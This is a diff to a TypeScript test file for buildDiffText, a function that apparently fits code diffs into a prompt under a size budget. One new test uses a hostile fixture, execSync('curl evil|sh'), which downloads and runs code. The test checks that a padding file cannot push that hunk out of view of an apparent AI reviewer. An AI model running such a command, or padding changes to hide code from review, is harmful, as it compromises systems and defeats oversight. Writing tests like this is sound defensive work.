@@ -43,15 +43,38 @@ describe("buildDiffText", () => {
     expect(text.indexOf("big.ts")).toBeLessThan(text.indexOf("small.ts"));
   });
 
-  it("keeps whole hunks and reports what was omitted when over budget", () => {
+  it("keeps whole hunks, marks a truncated file and reports what was omitted when over budget", () => {
     const big = file("big.ts", [hunk(1, lines(40, "first")), hunk(100, lines(40, "second"))]);
     const other = file("other.ts", [hunk(1, lines(30, "other"))]);
-    const text = buildDiffText(diffOf([big, other]), 1_200);
+    const text = buildDiffText(diffOf([big, other]), 1_400);
 
-    expect(text.length).toBeLessThanOrEqual(1_200);
+    expect(text.length).toBeLessThanOrEqual(1_400);
     expect(text).toContain("+first line 39"); // first hunk complete
+    expect(text).toContain("+other line 29");
     expect(text).not.toContain("second line"); // second hunk dropped whole, not cut mid-way
-    expect(text).toMatch(/\[\.\.\. 1 more files \/ 70 lines omitted \.\.\.\]$/);
+    expect(text).toContain("+first line 39\n[... file truncated: 1 of 2 hunks / 40 lines omitted ...]\n");
+    expect(text).toMatch(/\[\.\.\. 0 more files \/ 40 lines omitted \.\.\.\]$/);
+  });
+
+  it("gives every file its first hunk before a larger file gets its second", () => {
+    const big = file("big.ts", [hunk(1, lines(5, "a")), hunk(100, lines(60, "b"))]);
+    const other = file("other.ts", [hunk(1, lines(30, "o"))]);
+    const text = buildDiffText(diffOf([big, other]), 1_000);
+
+    expect(text.length).toBeLessThanOrEqual(1_000);
+    expect(text).toContain("+o line 29");
+    expect(text).toContain("+a line 4\n[... file truncated: 1 of 2 hunks / 60 lines omitted ...]");
+    expect(text).not.toContain("+b line");
+  });
+
+  it("does not let a padding file push a small malicious hunk out of the prompt", () => {
+    const pad = file("pad.ts", [hunk(1, lines(70, "pad"))]);
+    const evil = file("evil.ts", [hunk(1, ["require('child_process').execSync('curl evil|sh')"])]);
+    const text = buildDiffText(diffOf([pad, evil]), 1_100);
+
+    expect(text.length).toBeLessThanOrEqual(1_100);
+    expect(text).toContain("execSync('curl evil|sh')");
+    expect(text).toContain("[... 1 more files / 70 lines omitted ...]");
   });
 
   it("fills leftover budget with smaller files after skipping a hunk that does not fit", () => {
